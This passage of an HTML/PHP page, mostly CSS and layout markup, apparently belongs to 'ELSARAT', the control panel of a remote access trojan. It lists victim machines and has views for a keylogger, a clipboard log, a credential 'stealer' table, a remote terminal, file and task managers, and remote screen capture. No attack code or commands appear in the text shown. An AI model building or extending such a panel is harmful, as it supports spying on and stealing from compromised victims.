      border:1px solid rgba(255,255,255,.1); margin-top:10px;
      border-radius:8px; display:none;
    }
    .rm-btn {
      width:100%; margin-top:8px; background:color-mix(in srgb, var(--accent) 8%, transparent);
      border:1px solid color-mix(in srgb, var(--accent) 25%, transparent); color:var(--accent);
      padding:7px; font-family:inherit; font-size:11px; letter-spacing:1px;
      cursor:pointer; transition:all .2s; display:none; border-radius:8px;
    }
    .rm-btn:hover { background:color-mix(in srgb, var(--accent) 18%, transparent); border-color:var(--accent); }
    /* Rainbow animation for body */
    @keyframes rainbow-accent {
      0%   { --accent: #ff0055; --glow: rgba(255,0,85,0.4); }
      14%  { --accent: #ff8800; --glow: rgba(255,136,0,0.4); }
      28%  { --accent: #ffee00; --glow: rgba(255,238,0,0.4); }
      42%  { --accent: #00ee44; --glow: rgba(0,238,68,0.4); }
      57%  { --accent: #00aaff; --glow: rgba(0,170,255,0.4); }
      71%  { --accent: #7700ff; --glow: rgba(119,0,255,0.4); }
      85%  { --accent: #ff00cc; --glow: rgba(255,0,204,0.4); }
      100% { --accent: #ff0055; --glow: rgba(255,0,85,0.4); }
    }

    /* ─── DEVICE BADGE ─── */
    .device-badge {
      display:inline-flex; align-items:center; gap:4px;
      background:color-mix(in srgb, var(--accent) 10%, transparent); border:1px solid color-mix(in srgb, var(--accent) 25%, transparent);
      color:var(--accent); font-size:9px; letter-spacing:1px;
      padding:2px 8px; border-radius:2px;
    }

    /* ═══════════════════════════════════════════════════
       MOBILE & RESPONSIVE — ≤ 767px
       ═══════════════════════════════════════════════════ */
    @media (max-width: 767px) {

      /* ── Prevent any horizontal overflow on the page ── */
      html, body { overflow-x: hidden; max-width: 100%; }
      * { min-width: 0; }

      /* ── HEADER ── */
      .header { padding: 0 8px; height: 46px; gap: 0; }
      .logo { font-size: 11px; letter-spacing: 1px; flex: 0 0 auto; display: flex; align-items: center; gap: 4px; }
      .logo-img { height: 34px; width: auto; margin-left: 0; }
      .nav { gap: 5px; flex-shrink: 0; }
      .nav-sep { display: none; }
      /* Nav text buttons — keep compact */
      .nav-btn { font-size: 10px; letter-spacing: 0; padding: 5px 7px; }
      /* Settings icon */
      .icon-btn { padding: 5px 8px; font-size: 13px; }
      /* Logout button — icon only */
      .admin-btn { padding: 5px 9px; font-size: 10px; border-radius: 16px; }
      .admin-btn span { display: inline; font-size: 13px; }
      /* Hide username text, keep power icon */
      .admin-btn-name { display: none; }

      /* ── MAIN CONTENT ── */
      .main { padding: 10px 8px; overflow-x: hidden; }
      .stats-page { padding: 10px 8px; }

      /* ── SECTION ROW: stack vertically ── */
      .section-row {
        flex-direction: column;
        align-items: stretch;
        gap: 8px;
        margin-bottom: 10px;
      }
      .section-title { font-size: 11px; letter-spacing: 2px; }
      /* Search: full width */
      .search-wrap { width: 100%; }
      .search-input { width: 100% !important; font-size: 12px; }

      /* ── TABLE: full-width, no horizontal overflow ── */
      .table-wrap { border-radius: 10px; max-width: 100%; overflow-x: hidden; }
      .client-table { min-width: 0 !important; font-size: 11px; width: 100%; table-layout: fixed; }
      /* Show: ID(1) USER(3) IP(5) PING(6)  |  Hide: LOC(2) PC_NAME(4) ACTIVE_WND(7) */
      .client-table th:nth-child(2),
      .client-table td:nth-child(2) { display: none !important; }
      .client-table th:nth-child(4),
      .client-table td:nth-child(4) { display: none !important; }
      .client-table th:nth-child(7),
      .client-table td:nth-child(7) { display: none !important; }
      /* Column widths for 4 visible columns */
      .client-table th:nth-child(1), .client-table td:nth-child(1) { width: 14%; }
      .client-table th:nth-child(3), .client-table td:nth-child(3) { width: 32%; }
      .client-table th:nth-child(5), .client-table td:nth-child(5) { width: 26%; }
      .client-table th:nth-child(6), .client-table td:nth-child(6) { width: 28%; }
      .client-table th { padding: 10px 8px; font-size: 9px; letter-spacing: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
      .client-table td { padding: 10px 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
      .td-ip { font-size: 10px; letter-spacing: 0; }
      .td-user { font-size: 11px; }
      .ping-cell { gap: 4px; font-size: 10px; }
      .ping-cell .dot { width: 6px; height: 6px; }

      /* ── STATS GRID ── */
      .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 12px; }
      .stat-card { padding: 14px 14px; }
      .stat-val { font-size: 22px; }
      .stat-label { font-size: 8px; }

      /* ── SETTINGS PANEL ── */
      .settings-panel { width: 90vw; max-width: 320px; border-radius: 16px 0 0 16px; }
      .sp-body { padding: 12px 10px; gap: 10px; }
      .sg { padding: 10px 12px; }

      /* ── CLIENT PANEL ── */
      .client-panel { min-height: auto; }
      .client-panel.show { flex-direction: column; min-height: auto; }
      /* Sidebar: horizontal tab bar on mobile */
      .cp-sidebar {
        width: 100% !important;
        height: auto; min-height: 0;
        flex-direction: row; overflow-x: auto; overflow-y: hidden;
        border-right: none; border-bottom: 1px solid color-mix(in srgb, var(--accent) 20%, transparent);
        flex-shrink: 0; -webkit-overflow-scrolling: touch;
      }
      .cp-nav { flex-direction: row; overflow-x: auto; flex: 0 0 auto; -webkit-overflow-scrolling: touch; }
      .back-btn {
        border-bottom: none; border-right: 1px solid color-mix(in srgb, var(--accent) 15%, transparent);
        padding: 10px 12px; flex-shrink: 0; white-space: nowrap;
      }
      .cp-tab {
        flex-direction: column; padding: 8px 10px;
        border-bottom: none; border-right: 1px solid rgba(255,255,255,.03);
        width: auto; flex-shrink: 0; min-width: 52px;
        align-items: center; border-radius: 0;
      }
      .cp-tab.active { border-left: none; border-bottom: 2px solid var(--accent); background: color-mix(in srgb, var(--accent) 10%, transparent); }
      .cp-tab-label { font-size: 7.5px; text-align: center; letter-spacing: 0; }
      .cp-tab-icon { margin: 0; font-size: 12px; }
      .cp-dot { display: none; }
      .cp-client-tag, .cp-offline-bar { display: none; }
      .cp-content { flex: 1; min-height: calc(100vh - 170px); overflow-x: hidden; }
      .tab-pane { padding: 10px 8px; overflow-x: hidden; }

      /* ── INFO TABLE ── */
      .info-key { padding: 8px 10px; width: 110px; font-size: 9px; }
      .info-val { padding: 8px 8px 8px 0; font-size: 11px; }

      /* ── ROLL GRID ── */
      .roll-grid { grid-template-columns: repeat(2,1fr); gap: 8px; }
      .roll-thumb { height: 75px; }

      /* ── TERMINAL / COMMS / REMOTE ── */
      .terminal-wrap { height: 280px; }
      .term-out { font-size: 11px; }
      .comms-wrap { height: 280px; }
      .remote-screen { height: 170px; }

      /* ── MISC ── */
      .quick-tools-grid { grid-template-columns: repeat(2,1fr); }
      .device-badge { display: none; }
      .overflow-table { overflow-x: auto; -webkit-overflow-scrolling: touch; }
    }

    /* ── Very small screens ≤ 400px ── */
    @media (max-width: 400px) {
      .logo { font-size: 12px; }
      .nav-btn { font-size: 9px; padding: 4px 5px; }
      .client-table th { padding: 9px 8px; }
      .client-table td { padding: 10px 8px; }
    }

    ::-webkit-scrollbar { width:5px; height:5px; }
    ::-webkit-scrollbar-track { background:rgba(0,0,0,.3); }
    ::-webkit-scrollbar-thumb { background:var(--accent); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:color-mix(in srgb, var(--accent) 80%, transparent); }

    /* ═══════════════════════════════════════════════════
       TRANSPARENT-BG READABILITY OVERRIDES
       Tăng độ sáng toàn bộ text + text-shadow để dễ đọc
       dù background-overlay giảm về 0
       ═══════════════════════════════════════════════════ */

    /* Màu text secondary (trước dùng #555/#666/#777) → sáng hơn */
    .nav-btn         { color:#fff !important; text-shadow:0 1px 4px rgba(0,0,0,.9); }
    .nav-sep         { color:#555 !important; }
    .icon-btn        { color:#bbb !important; }
    .admin-btn       { color:#ccc !important; }

    /* Table */
    .client-table td              { color:#eee !important; text-shadow:0 1px 3px rgba(0,0,0,.85); }
    .td-id                        { color:var(--accent) !important; text-shadow:0 0 8px var(--glow); }
    .td-loc                       { color:#bbb !important; }
    .td-user                      { color:#fff !important; text-shadow:0 1px 4px rgba(0,0,0,.9); }
    .td-pcname                    { color:#e0e0e0 !important; }
    .pc-icon                      { color:#999 !important; }
    .td-ip                        { color:#d0d0d0 !important; letter-spacing:1px; }
    .td-active                    { color:#aaa !important; }
    .ping-cell                    { color:#ccc !important; }

    /* Stats */
    .stat-label { color:#aaa !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .stat-val   { text-shadow:0 0 16px var(--glow),0 1px 4px rgba(0,0,0,.9) !important; }
    .stat-sub   { color:#999 !important; }

    /* Client panel sidebar */
    .cp-tab       { color:#fff !important; }
    .cp-tab.active { color:var(--accent) !important; }
    .cp-tab-label { text-shadow:0 1px 3px rgba(0,0,0,.8); }

    /* Info table */
    .info-key { color:#aaa !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .info-val { color:#f0f0f0 !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }

    /* Keylogger / clipboard */
    .kl-count { color:#999 !important; }
    .kl-time  { color:#999 !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .kl-win   { color:var(--accent) !important; }
    .kl-text  { color:#eee !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .clipboard-text { color:#eee !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }

    /* Terminal */
    .term-out   { color:#e8e8e8 !important; text-shadow:0 1px 2px rgba(0,0,0,.9); }
    .term-input { color:#f5f5f5 !important; }
    .term-prompt { text-shadow:0 0 8px var(--glow); }

    /* File manager */
    .file-name { color:#eee !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .dir-name  { color:#88aaff !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .file-path-input { color:#eee !important; }

    /* Task manager */
    .task-name { color:#eee !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .task-pid  { color:var(--accent) !important; }
    .task-cpu  { color:#bbb !important; }
    .task-mem  { color:#bbb !important; }

    /* Proxy */
    .proxy-label  { color:#aaa !important; }
    .proxy-input  { color:#eee !important; }
    .proxy-select { color:#eee !important; }
    .chain-ip     { color:#eee !important; }
    .chain-num    { color:var(--accent) !important; }

    /* Stealer table */
    .stealer-table td { color:#eee !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }

    /* Comms */
    .comms-msg-client { color:#ccc !important; }
    .comms-msg-time   { color:#999 !important; }
    .comms-input      { color:#f0f0f0 !important; }

    /* Roll/screenshots */
    .roll-time { color:#aaa !important; }

    /* Code editor */
    .code-editor { color:#eee !important; }
    .code-output { color:#ddd !important; }

    /* Search & inputs toàn trang */
    .search-input            { color:#eee !important; }
    .search-input::placeholder { color:#777 !important; }
    .search-icon             { color:#888 !important; }
    .comment-input           { color:#eee !important; }
    .hex-input               { color:#eee !important; }

    /* Settings panel */
    .sg label { color:#bbb !important; text-shadow:0 1px 3px rgba(0,0,0,.8); }
    .sval { color:var(--accent) !important; }

    /* Stats legend */
    .legend-item { color:#aaa !important; }

    /* Stats title */
    .stats-title { color:#bbb !important; }

    /* Section title */
    .section-title { text-shadow:0 1px 4px rgba(0,0,0,.9); color:#fff !important; }

    /* Empty / loading states */
    .empty-state   { color:#888 !important; }
    .loading-state { color:#888 !important; }
    .remote-label  { color:#aaa !important; }
    .remote-sub    { color:#888 !important; }

    /* Ticker */
    .ticker { color:color-mix(in srgb, var(--accent) 90%, transparent) !important; }
    .ticker-item.warn { color:#ffbb33 !important; }

    /* ADMIN CHAT — đọc được khi bg trong suốt */
    .cw-msg-sender { text-shadow:0 0 8px var(--glow); }
    .cw-msg-time   { color:#999 !important; text-shadow:0 1px 3px rgba(0,0,0,.9); }
    .cw-msg-text   { color:#f0f0f0 !important; text-shadow:0 1px 4px rgba(0,0,0,.9); }
    .cw-empty      { color:#888 !important; }
    .cw-input      { color:#f0f0f0 !important; }
    .cw-input::placeholder { color:#777 !important; }

    /* Các panel card — thêm backdrop-blur để text luôn rõ */
    .table-wrap      { backdrop-filter:blur(4px); -webkit-backdrop-filter:blur(4px); }
    .info-box        { backdrop-filter:blur(4px); -webkit-backdrop-filter:blur(4px); }
    .terminal-wrap   { backdrop-filter:blur(4px); -webkit-backdrop-filter:blur(4px); }
    .clipboard-entry { backdrop-filter:blur(4px); -webkit-backdrop-filter:blur(4px); }
    .stat-card       { backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px); }
    .proxy-chain     { backdrop-filter:blur(4px); -webkit-backdrop-filter:blur(4px); }
    #chatWindow      { backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); }

    /* ─── ADMIN CHAT WIDGET ─── */
    #chatFab {
      position:fixed; bottom:22px; left:22px; z-index:300;
      width:46px; height:46px; border-radius:14px;
      background:color-mix(in srgb, var(--accent) 15%, transparent); border:1px solid color-mix(in srgb, var(--accent) 40%, transparent);
      color:var(--accent); font-size:20px; cursor:pointer;
      display:flex; align-items:center; justify-content:center;
      transition:all .2s; box-shadow:0 4px 20px rgba(0,0,0,.4), 0 0 16px color-mix(in srgb, var(--accent) 15%, transparent);
      font-family:inherit;
    }
    #chatFab:hover { background:color-mix(in srgb, var(--accent) 28%, transparent); box-shadow:0 4px 24px rgba(0,0,0,.5), 0 0 24px color-mix(in srgb, var(--accent) 30%, transparent); transform:scale(1.06); }

    /* ─── SETTING FAB ─── */
    #settingFab {
      position:fixed; bottom:22px; right:22px; z-index:300;
      height:36px; padding:0 14px; border-radius:10px;
      background:color-mix(in srgb, var(--accent) 12%, transparent);
      border:1px solid color-mix(in srgb, var(--accent) 35%, transparent);
      color:var(--accent); font-size:10px; letter-spacing:2px; cursor:pointer;
      display:flex; align-items:center; gap:7px;
      transition:all .2s;
      box-shadow:0 4px 20px rgba(0,0,0,.4), 0 0 14px color-mix(in srgb, var(--accent) 12%, transparent);
      font-family:inherit;
    }
    #settingFab:hover {
      background:color-mix(in srgb, var(--accent) 25%, transparent);
      box-shadow:0 4px 24px rgba(0,0,0,.5), 0 0 22px color-mix(in srgb, var(--accent) 28%, transparent);
      transform:translateY(-2px);
    }
    #settingFab .sf-icon { font-size:14px; }
    #chatFab .chat-unread {
      position:absolute; top:-5px; right:-5px;
      background:var(--accent); color:#fff; font-size:9px;
      width:17px; height:17px; border-radius:50%;
      display:none; align-items:center; justify-content:center;
      font-weight:bold; border:2px solid #08050c;
    }
    #chatFab .chat-unread.show { display:flex; }
    #chatWindow {
      position:fixed; bottom:78px; left:22px; z-index:299;
      width:300px; max-height:420px;
      background:rgba(8,5,18,.98);
      border:1px solid color-mix(in srgb, var(--accent) 35%, transparent);
      border-radius:16px;
      display:flex; flex-direction:column;
      transform:scale(.92) translateY(14px); opacity:0; pointer-events:none;
      transition:transform .25s cubic-bezier(.4,0,.2,1), opacity .25s;
      box-shadow:-4px 0 40px rgba(0,0,0,.7), 0 0 30px color-mix(in srgb, var(--accent) 8%, transparent);
    }
    #chatWindow.open { transform:scale(1) translateY(0); opacity:1; pointer-events:all; }
    .cw-header {
      background:linear-gradient(135deg,color-mix(in srgb, var(--accent) 15%, transparent),color-mix(in srgb, var(--accent) 6%, transparent));
      border-bottom:1px solid color-mix(in srgb, var(--accent) 20%, transparent);
      padding:11px 14px;
      display:flex; align-items:center; justify-content:space-between;
      border-radius:16px 16px 0 0; flex-shrink:0;
    }
    .cw-title { color:var(--accent); font-size:11px; letter-spacing:2px; display:flex; align-items:center; gap:7px; }
    .cw-title-dot { width:7px; height:7px; border-radius:50%; background:var(--accent); box-shadow:0 0 6px var(--accent); animation:pulse 2s infinite; }
    .cw-close {
      background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.1);
      color:#777; cursor:pointer; font-size:12px; font-family:inherit;
      transition:all .2s; width:24px; height:24px; border-radius:7px;
      display:flex; align-items:center; justify-content:center;
    }
    .cw-close:hover { border-color:color-mix(in srgb, var(--accent) 50%, transparent); color:var(--accent); background:color-mix(in srgb, var(--accent) 10%, transparent); }
    .cw-messages {
      flex:1; overflow-y:auto; padding:10px 12px;
      display:flex; flex-direction:column; gap:8px;
      min-height:0; max-height:300px;
    }
    .cw-msg { display:flex; flex-direction:row; gap:8px; align-items:flex-start; }
    .cw-msg-avatar { width:28px; height:28px; border-radius:50%; flex-shrink:0; background:color-mix(in srgb, var(--accent) 20%, transparent); border:1px solid color-mix(in srgb, var(--accent) 35%, transparent); display:flex; align-items:center; justify-content:center; font-size:11px; color:var(--accent); overflow:hidden; margin-top:2px; }
    .cw-msg-avatar img { width:100%; height:100%; object-fit:cover; }
    .cw-msg-body { display:flex; flex-direction:column; gap:2px; flex:1; min-width:0; }
    .cw-msg-header { display:flex; align-items:baseline; gap:7px; }
    .cw-msg-sender { font-size:11px; font-weight:bold; color:var(--accent); letter-spacing:.5px; }
    .cw-msg-time { font-size:9px; color:#444; }
    .cw-msg-text { font-size:12px; color:#ccc; line-height:1.5; word-break:break-word; padding-left:2px; }
    .cw-msg.mine .cw-msg-sender { color:#aaa; }
    .cw-msg.mine .cw-msg-avatar { border-color:rgba(255,255,255,.15); background:rgba(255,255,255,.06); color:#aaa; }
    /* Profile settings */
    .profile-preview-row { display:flex; gap:12px; align-items:center; margin-bottom:4px; }
    .profile-avatar-wrap { width:52px; height:52px; border-radius:50%; flex-shrink:0; background:color-mix(in srgb, var(--accent) 12%, transparent); border:2px solid color-mix(in srgb, var(--accent) 40%, transparent); display:flex; align-items:center; justify-content:center; font-size:20px; color:var(--accent); overflow:hidden; box-shadow:0 0 12px color-mix(in srgb, var(--accent) 20%, transparent); }
    .profile-avatar-wrap img { width:100%; height:100%; object-fit:cover; }
    .sp-field-label { font-size:9px; letter-spacing:1.5px; color:#555; text-transform:uppercase; margin-bottom:4px; }
    .cw-empty { color:#444; font-size:11px; letter-spacing:1px; text-align:center; padding:24px 0; }
    .cw-input-row {
      display:flex; align-items:center; gap:7px;
      border-top:1px solid color-mix(in srgb, var(--accent) 12%, transparent);
      padding:9px 12px;
      background:color-mix(in srgb, var(--accent) 3%, transparent);
      border-radius:0 0 16px 16px; flex-shrink:0;
    }
    .cw-input {
      flex:1; background:rgba(0,0,0,.35); border:1px solid rgba(255,255,255,.08);
      color:#ddd; font-family:inherit; font-size:12px;
      padding:7px 11px; outline:none; min-width:0;
      border-radius:9px; transition:border-color .2s;
    }
    .cw-input:focus { border-color:color-mix(in srgb, var(--accent) 40%, transparent); color:#fff; }
    .cw-input::placeholder { color:#444; }
    .cw-send {
      background:color-mix(in srgb, var(--accent) 15%, transparent); border:1px solid color-mix(in srgb, var(--accent) 40%, transparent);
      color:var(--accent); font-family:inherit; font-size:13px;
      width:34px; height:34px; border-radius:10px; cursor:pointer;
      display:flex; align-items:center; justify-content:center;
      transition:all .2s; flex-shrink:0;
    }
    .cw-send:hover { background:color-mix(in srgb, var(--accent) 30%, transparent); box-shadow:0 0 10px color-mix(in srgb, var(--accent) 25%, transparent); }
    @media (max-width:767px) {
      #chatWindow { width:calc(100vw - 36px); left:18px; bottom:72px; }
      #chatFab { bottom:16px; left:16px; }
    }

    /* ─── SHARED ─── */
    .sec-head { display:flex; align-items:center; justify-content:space-between; margin-bottom:14px; flex-wrap:wrap; gap:8px; }
    .empty-state { color:#555; padding:24px; text-align:center; font-size:12px; letter-spacing:2px; }
    .loading-state { color:#444; padding:24px; text-align:center; font-size:12px; letter-spacing:1px; }
    .tag { display:inline-block; font-size:9px; padding:2px 6px; letter-spacing:1px; border-radius:1px; }
    .tag-online { background:color-mix(in srgb, var(--accent) 15%, transparent); color:var(--accent); border:1px solid color-mix(in srgb, var(--accent) 30%, transparent); }
    .tag-recent { background:rgba(128,128,128,.1); color:#888; border:1px solid #444; }
    .tag-away { background:rgba(50,50,50,.3); color:#555; border:1px solid #333; }
    .divider { height:1px; background:linear-gradient(90deg,color-mix(in srgb, var(--accent) 30%, transparent),transparent); margin:12px 0; }
    .overflow-table { overflow-x:auto; }

    /* ─── ACCENT GLOW BAR ─── */
    #accentGlowBar {
      width:100%; height:44px;
      position:relative; overflow:hidden;
      flex-shrink:0; pointer-events:none;
      display:flex; align-items:center; justify-content:center;
    }
    #accentGlowBar::before {
      content:'';
      position:absolute; inset:0;
      background:linear-gradient(90deg,
        transparent 0%,
        var(--accent) 25%,
        var(--accent) 75%,
        transparent 100%);
      opacity:.1;
      transition:background .3s;
    }
    #accentGlowBar::after {
      content:'';
      position:absolute;
      top:50%; left:15%; right:15%; height:28px;
      transform:translateY(-50%);
      background:var(--accent);
      opacity:.22;
      filter:blur(18px);
      border-radius:50%;
      transition:background .3s;
    }
    .agb-line {
      position:absolute; bottom:0; left:0; right:0; height:1px;
      background:linear-gradient(90deg,transparent,var(--accent),transparent);
      opacity:.4;
    }

    /* ─── SETTINGS ACCENT PREVIEW ─── */
    #accentPreviewBar {
      width:100%; height:32px; border-radius:8px; margin-bottom:10px;
      position:relative; overflow:hidden;
      background:linear-gradient(90deg,
        transparent 0%,
        var(--accent) 30%,
        var(--accent) 70%,
        transparent 100%);
      opacity:.35;
      transition:background .3s;
      box-shadow:0 0 16px var(--glow);
    }

    /* ─── LIGHT THEME OVERRIDES (khi bg ảnh sáng) ─── */
    html[data-theme="light"] body { color:#1e1f1f; }
    html[data-theme="light"] .client-table td     { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .td-user             { color:#0a0a0a !important; text-shadow:none !important; }
    html[data-theme="light"] .td-loc              { color:#444 !important; }
    html[data-theme="light"] .td-ip               { color:#333 !important; }
    html[data-theme="light"] .td-pcname           { color:#222 !important; }
    html[data-theme="light"] .td-active           { color:#555 !important; }
    html[data-theme="light"] .ping-cell           { color:#333 !important; }
    html[data-theme="light"] .info-key            { color:#555 !important; text-shadow:none !important; }
    html[data-theme="light"] .info-val            { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .kl-text             { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .kl-count,
    html[data-theme="light"] .kl-time             { color:#666 !important; text-shadow:none !important; }
    html[data-theme="light"] .clipboard-text      { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .term-out            { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .term-input          { color:#1e1f1f !important; }
    html[data-theme="light"] .file-name           { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .file-path-input     { color:#1e1f1f !important; }
    html[data-theme="light"] .task-name           { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .task-cpu,
    html[data-theme="light"] .task-mem            { color:#555 !important; }
    html[data-theme="light"] .proxy-input,
    html[data-theme="light"] .proxy-select        { color:#1e1f1f !important; }
    html[data-theme="light"] .proxy-label         { color:#555 !important; }
    html[data-theme="light"] .chain-ip            { color:#1e1f1f !important; }
    html[data-theme="light"] .stealer-table td    { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .comms-msg-client    { color:#333 !important; }
    html[data-theme="light"] .comms-input         { color:#1e1f1f !important; }
    html[data-theme="light"] .code-editor,
    html[data-theme="light"] .code-output         { color:#1e1f1f !important; }
    html[data-theme="light"] .search-input        { color:#1e1f1f !important; }
    html[data-theme="light"] .stat-label          { color:#555 !important; text-shadow:none !important; }
    html[data-theme="light"] .stat-sub            { color:#666 !important; }
    html[data-theme="light"] .nav-btn             { color:#fff !important; text-shadow:none !important; }
    html[data-theme="light"] .cp-tab              { color:#fff !important; }
    html[data-theme="light"] .cp-tab.active       { color:var(--accent) !important; }
    html[data-theme="light"] .section-title       { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .roll-time           { color:#555 !important; }
    html[data-theme="light"] .legend-item         { color:#555 !important; }
    html[data-theme="light"] .stats-title         { color:#444 !important; }
    html[data-theme="light"] .sg label            { color:#444 !important; text-shadow:none !important; }
    html[data-theme="light"] .hex-input           { color:#1e1f1f !important; }
    html[data-theme="light"] .remote-label        { color:#444 !important; }
    html[data-theme="light"] .remote-sub          { color:#666 !important; }
    html[data-theme="light"] .cw-msg-text         { color:#1e1f1f !important; text-shadow:none !important; }
    html[data-theme="light"] .cw-msg-time         { color:#777 !important; text-shadow:none !important; }
    html[data-theme="light"] .cw-input            { color:#1e1f1f !important; }
    html[data-theme="light"] .cw-input::placeholder { color:#999 !important; }
    html[data-theme="light"] .cw-empty            { color:#888 !important; }
    html[data-theme="light"] .table-wrap          { background:rgba(255,255,255,.35) !important; }
    html[data-theme="light"] .stat-card           { background:rgba(255,255,255,.45) !important; }
    html[data-theme="light"] .info-box            { background:rgba(255,255,255,.35) !important; }
    html[data-theme="light"] .terminal-wrap       { background:rgba(255,255,255,.35) !important; }
    html[data-theme="light"] #chatWindow          { background:rgba(255,255,255,.92) !important; }
    html[data-theme="light"] .client-table thead tr { background:color-mix(in srgb, var(--accent) 8%, transparent) !important; }
    html[data-theme="light"] .tool-btn            { color:#1a1a1a !important; border-color:#bbb !important; background:rgba(0,0,0,.06) !important; }
    html[data-theme="light"] .tool-btn:hover      { color:var(--accent) !important; border-color:var(--accent) !important; background:color-mix(in srgb, var(--accent) 10%, transparent) !important; }
    html[data-theme="light"] .tool-btn.danger     { color:#c0392b !important; }
    html[data-theme="light"] .fm-panel            { background:rgba(255,255,255,.55) !important; border-color:color-mix(in srgb, var(--accent) 30%, transparent) !important; }
    html[data-theme="light"] .fm-panel-input      { background:rgba(255,255,255,.8) !important; border-color:#ccc !important; color:#1e1f1f !important; }
    html[data-theme="light"] .fm-panel-input:focus{ border-color:var(--accent) !important; }
    html[data-theme="light"] .fm-file-label       { background:rgba(255,255,255,.8) !important; border-color:#ccc !important; color:#555 !important; }
    html[data-theme="light"] .fm-file-label:hover { border-color:var(--accent) !important; color:#1e1f1f !important; }
    html[data-theme="light"] .client-table tbody tr { background:rgba(0,0,0,.04) !important; }
    html[data-theme="light"] .client-table tbody tr:hover { background:color-mix(in srgb, var(--accent) 8%, transparent) !important; }

    /* Indicator badge in corner showing current theme */
    #themeBadge {
      position:fixed; bottom:74px; right:14px; z-index:250;
      font-size:9px; letter-spacing:1px; padding:3px 8px;
      border-radius:6px; border:1px solid rgba(255,255,255,.12);
      background:rgba(0,0,0,.45); color:#888;
      backdrop-filter:blur(6px); pointer-events:none;
      transition:all .3s; opacity:0;
    }
    #themeBadge.visible { opacity:1; }
  </style>
</head>
<body>
<div id="bg-layer"></div>
<div id="bg-overlay"></div>

<!-- ═══════════ ADMIN CHAT FAB ═══════════ -->
<button id="chatFab" onclick="location.href='chat.php'" title="Mở Admin Chat">💬<span class="chat-unread" id="chatBadge"></span></button>

<!-- ═══════════ DASHBOARD ═══════════ -->

<!-- HEADER -->
<header class="header">
  <div class="logo">&gt;_ ELSARAT<img id="logoImg" src="elsarat-logo.png" class="logo-img" alt="logo"></div>
  <nav class="nav">
    <button class="nav-btn active" id="nav-dash" onclick="showPage('dashboard')">DASHBOARD</button>
    <span class="nav-sep">|</span>
    <button class="nav-btn" id="nav-stats" onclick="showPage('stats')">STATS</button>
    <button class="icon-btn" onclick="toggleSettings()" title="Settings">⚙</button>
    <a href="profile.php" class="admin-btn" title="Xem / chỉnh sửa hồ sơ" style="text-decoration:none;">
      <span class="admin-btn-name" id="headerUsername"><?= $authedUser ?></span>
      <span id="headerAvatarWrap" style="display:none;width:22px;height:22px;border-radius:50%;overflow:hidden;flex-shrink:0;"><img id="headerAvatar" style="width:100%;height:100%;object-fit:cover;" alt="av" /></span>
    </a>
  </nav>
</header>

<!-- ACCENT GLOW BAR -->
<div id="accentGlowBar"><span class="agb-line"></span></div>

<!-- TICKER -->
<div class="ticker">
  <div class="ticker-inner" id="tickerInner"></div>
</div>

<!-- THEME BADGE -->
<div id="themeBadge"></div>

<!-- DASHBOARD PAGE -->
<div id="page-dashboard" class="main">
  <div class="section-row">
    <div class="section-title">
      <span class="bracket">&gt;</span> CLIENT_MATRIX
      <span class="device-badge" id="deviceBadge">PC</span>
    </div>
    <div class="search-wrap">
      <span class="search-icon">⌕</span>
      <input type="search" class="search-input" id="searchInput" placeholder="Search username, PC, IP..." oninput="filterTable()" />
      <div class="search-corner"></div>
      <div class="search-corner2"></div>
    </div>
  </div>
  <div class="table-wrap">
    <table class="client-table" id="clientTable">
      <thead>
        <tr><th>ID</th><th>LOC</th><th>USER</th><th>PC_NAME</th><th>IP_ADDR</th><th>LAST_PING</th><th>ACTIVE_WND</th></tr>
      </thead>
      <tbody id="tableBody"></tbody>
    </table>
  </div>
</div>

<!-- STATS PAGE -->
<div id="page-stats" class="stats-page" style="display:none">
  <div class="section-title"><span class="bracket">&gt;</span> SYS_STATS</div>
  <div class="stats-grid" id="statsGrid"></div>
</div>

<!-- CLIENT PANEL -->
<div class="client-panel" id="clientPanel">
  <aside class="cp-sidebar" id="cpSidebar">
    <button class="back-btn" onclick="closePanel()">← BACK</button>
    <nav class="cp-nav" id="cpNav"></nav>
    <div class="cp-client-tag">
      <span class="status-dot online" id="cpDot"></span>
      <span class="cp-client-name" id="cpName"></span>
    </div>
    <div class="cp-offline-bar">
      <span class="status-dot online" id="cpDot2"></span>
      <span style="margin-left:6px;font-size:9px;letter-spacing:1px;color:#777" id="cpStatus"></span>
    </div>
  </aside>
  <section class="cp-content" id="cpContent"></section>
</div>

<!-- SETTINGS BACKDROP + PANEL -->
<div class="settings-backdrop" id="settingsBackdrop" onclick="toggleSettings()"></div>
<div class="settings-panel" id="settingsPanel">
  <div class="sp-header">
    <span class="sp-title"><span class="sp-title-icon">⚙</span> SETTINGS</span>
    <button class="sp-close" onclick="toggleSettings()">✕</button>
  </div>
  <div class="sp-body">
    <div class="sg">
      <label>ACCENT COLOR</label>
      <div id="accentPreviewBar"></div>
      <div class="color-row">
        <input type="color" class="color-picker" id="colorPicker" value="#ff0090" oninput="setAccent(this.value)" />
        <input type="text" class="hex-input" id="hexInput" value="#ff0090" maxlength="7" oninput="hexChange(this.value)" placeholder="#ff0090" />
      </div>
      <div class="presets" id="presets"></div>
